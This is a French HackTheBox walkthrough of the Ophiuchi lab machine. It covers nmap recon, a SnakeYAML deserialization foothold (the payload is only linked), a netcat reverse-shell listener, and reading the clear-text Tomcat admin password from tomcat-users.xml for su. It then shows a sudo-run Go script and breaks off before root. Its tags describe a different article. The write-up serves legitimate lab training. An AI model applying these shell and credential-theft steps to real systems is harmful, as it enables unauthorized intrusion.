---
title: "HackTheBox - Ophiuchi"
description: pickle-fr.jpg
tags: ["Dans cet article je vous présente la machine que j'ai créée, une machine consacré au détéction de malware."]
---

Bonjour à tous, après un bon moment, je suis content de vous retrouver à nouveau sur mon site Web pour vous présenter la machine Ophiuchi de [HackTheBox](https://www.hackthebox.eu/).

Résumé :

- Une vulnérabilité de type désérialisation YAML (encore) est présente dans le service `Tomcat`.
- Le mot de passe de l'utilisateur est en clair dans le fichier de configuration de `Tomcat`, donc j'ai pu me connecter en tant que `admin`.
- Il est possible d'exécuter des commandes en tant que root grâce au fichier `sudoers`.

# Scan de port NMAP

    # Nmap 7.91 scan initiated Tue Mar 23 17:21:45 2021 as: nmap -p22,8080 -sC -sV -oA nmap/ophiuchi 10.10.10.227
    Nmap scan report for 10.10.10.227
    Host is up (0.040s latency).

    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA)
    |   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)
    |_  256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)
    8080/tcp open  http    Apache Tomcat 9.0.38
    |_http-title: Parse YAML
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Tue Mar 23 17:21:54 2021 -- 1 IP address (1 host up) scanned in 9.24 seconds
    
 Il s'avère que le port `22/tcp` est ouvert qui tourne sur `OpenSSH`, nous avons également le port `8080/tcp` qui tourne sur `Tomcat 9.0.38`. J'ai regardé un peu les dates des versions des ports ouverts, et il s'avère que c'est assez récent, donc il est peu probable que il y a une vulnérabilité ou des vulnérabilités dans un de ces services.
 
 # Tomcat
 
 Lorsque je me connecte sur le site, il y a un champ de texte qui propre de mettre du `YAML`, lorsque je saisi du texte, il m'affiche quelque chose de type :
 `Due to security reason this feature has been temporarily on hold. We will soon fix the issue!`
 
 J'étais sûr avec certitude que le serveur en `back-end` traitait ce que je tapais dans le champ de texte, car lorsque je met un caractère spécial comme `'` il m'affiche une erreur lorsque je soumet les informations.

    org.yaml.snakeyaml.scanner.ScannerImpl.scanFlowScalarSpaces(ScannerImpl.java:1916)
    org.yaml.snakeyaml.scanner.ScannerImpl.scanFlowScalar(ScannerImpl.java:1831)
    org.yaml.snakeyaml.scanner.ScannerImpl.fetchFlowScalar(ScannerImpl.java:1027)
    org.yaml.snakeyaml.scanner.ScannerImpl.fetchSingle(ScannerImpl.java:1002)
    org.yaml.snakeyaml.scanner.ScannerImpl.fetchMoreTokens(ScannerImpl.java:390)
    org.yaml.snakeyaml.scanner.ScannerImpl.checkToken(ScannerImpl.java:227)
    org.yaml.snakeyaml.parser.ParserImpl$ParseImplicitDocumentStart.produce(ParserImpl.java:195)
    org.yaml.snakeyaml.parser.ParserImpl.peekEvent(ParserImpl.java:158)
    org.yaml.snakeyaml.parser.ParserImpl.checkEvent(ParserImpl.java:148)
    org.yaml.snakeyaml.composer.Composer.getSingleNode(Composer.java:118)
    org.yaml.snakeyaml.constructor.BaseConstructor.getSingleData(BaseConstructor.java:150)
    org.yaml.snakeyaml.Yaml.loadFromReader(Yaml.java:490)
    org.yaml.snakeyaml.Yaml.load(Yaml.java:416)
    Servlet.doPost(Servlet.java:15)
    javax.servlet.http.HttpServlet.service(HttpServlet.java:652)
    javax.servlet.http.HttpServlet.service(HttpServlet.java:733)
    org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
    
 Je me suis renseigner sur le module `snakeyaml`, et en recharchant sur Google, il s'avère que ce module soit vulnérable à une attaque de désérialisation (donc possible d'exécuter des commandes), la fonction `load` de `YAML` est vulnérable à cela.
 
    Yaml yaml = new Yaml();
    Object obj = yaml.load("Toutes les choses que vous entrées passent par ici");
    
 Sur ce [site](https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858), cela explique comment organiser cela et exécuter des commandes, je vais pas vous le montrer ici. C'est un jeu d'enfant.

# tomcat > admin

En suivant les instructions du site, nous avons pu avoir un shell en tant que `tomcat`.

    root@kali:~/htb/Ophiuchi# nc -lvnp 4242
    listening on [any] 4242 ...
    connect to [10.10.14.19] from (UNKNOWN) [10.10.10.227] 57092
    /bin/sh: 0: can't access tty; job control turned off
    $ id
    uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)

Je vais également lancer `tty` pour avoir un shell en `bash` et plus propre.

    $ python3 -c "import pty;pty.spawn('/bin/bash')"
    
    
La première chose que je fais tout le temps lorsque j'ai un shell en tant que `tomcat`, je regarde automatiquement le fichier de configuration qui comporte le mot de passe pour voir ce que je peux en faire avec.

    tomcat@ophiuchi:~$ cat ~/conf/tomcat-users.xml|grep password
    <user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>
    [...SNIP...]

L'utilisateur est `admin` et le mot de passe est `whythereisalimit`, je vais voir si l'utilisateur `admin` existe dans le système :

    tomcat@ophiuchi:~/conf$ awk -F: '{print $1, $7}' /etc/passwd|grep bash
    root /bin/bash
    admin /bin/bash

En utilisant la commande `su` essayons si cela fonctionne :

    tomcat@ophiuchi:~/conf$ su - admin
    Password: whythereisalimit
    admin@ophiuchi:~$
    
# admin > root

En fesant `sudo -l`, on peut voir que j'ai des permissions d'exécuter une commande en tant que root :

    admin@ophiuchi:~$ sudo -l
    Matching Defaults entries for admin on ophiuchi:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User admin may run the following commands on ophiuchi:
        (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
        
 En regardant le script, essayons de comprendre le code `Go` :

```go
package main

import (
        "fmt"
        wasm "github.com/wasmerio/wasmer-go/wasmer"
        "os/exec"
        "log"
)


func main() {
        bytes, _ := wasm.ReadBytes("main.wasm")

        instance, _ := wasm.NewInstance(bytes)
        defer instance.Close()
        init := instance.Exports["info"]
        result,_ := init()
        f := result.String()
        if (f != "1") {
                fmt.Println("Not ready to deploy")
        } else {
                fmt.Println("Ready to deploy")
                out, err := exec.Command("/bin/sh", "deploy.sh").Output()
                if err != nil {
                        log.Fatal(err)
                }
                fmt.Println(string(out))
        }
}
```
